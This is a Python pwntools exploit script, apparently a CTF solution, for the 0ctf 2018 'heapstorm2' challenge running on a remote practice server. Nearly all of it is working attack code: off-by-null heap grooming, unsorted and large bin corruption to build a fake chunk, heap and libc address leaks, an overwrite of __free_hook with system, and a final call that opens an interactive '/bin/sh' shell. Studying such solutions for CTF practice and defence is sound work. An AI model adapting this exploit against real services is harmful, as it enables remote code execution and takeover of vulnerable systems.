# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './0ctf_2018_heapstorm2'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.23-buu.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28925'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=0
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size):
    cmd(1)
    sla('Size:',size)

def edit(idx,text):
    cmd(2)
    sla('Index',idx)
    sla('Size:',len(text))
    sa('Content:',text)

def delete(idx):
    cmd(3)
    sla('Index',idx)

def show(idx):
    cmd(4)
    sla('Index',idx)

# one_gad = one_gadget(libc.path)

def attack():

    add(0x18)
    add(0x508)
    add(0x18)

    edit(1 , 'a'*0x4f0 + p64(0x500))

    add(0x18)
    add(0x508)
    add(0x18)

    edit(1 , 'a'*0x4f0 + p64(0x500))

    add(0x18)

    delete(1)
    edit(0 , 'a'*(0X18 - 12))

    add(0x18) #1
    add(0x4d8)
    delete(1)
    delete(2)

    add(0x38)
    add(0x4e8)

    edit(4 , 'a'*0x4f0 + p64(0x500))
    delete(4)
    edit(3 , 'a'*(0x18 - 12))
    add(0x18)
    add(0x4d8)

    delete(4)
    delete(5)

    add(0x48)

    delete(2)
    add(0x4e8)
    delete(2)

    storage = 0x13370800
    fake_chunk = storage - 0x20

    payload = '\x00' * 0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)
    edit(7, payload)
    # 修改 unsorted bin

    payload = '\x00' * 0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5)
    edit(8, payload)
    # 修改 large bin

    add(0x48)

    payload = p64(0)*4 + p64(0) + p64(0x13377331) + p64(storage)
    edit(2, payload)

    payload = p64(0)*2 + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(fake_chunk+3) + p64(8)
    edit(0, payload)

    show(1)
    ru(']: ')
    heap = u64(p.recv(6).ljust(8, '\x00'))

    payload = p64(0)*2 + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(heap+0x10) + p64(8)
    edit(0, payload)
        
    show(1)

    __malloc_hook = l64() - 0x68
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)

    payload = p64(0)*2 + p64(0) + p64(0x13377331) + p64(storage) + p64(0x1000) + p64(__free_hook) + p64(0x100) + p64(storage+0x50) + p64(8) + '/bin/sh\x00'
    edit(0, payload)
    edit(1, p64(system_addr))
    delete(2)

    # 把 key 修改为 0 后异或就无所谓了

    # dbg()

    p.interactive()

attack()

'''
@File    :   0ctf_2018_heapstorm2.py
@Time    :   2021/08/27 12:40:06
@Author  :   Niyah 
'''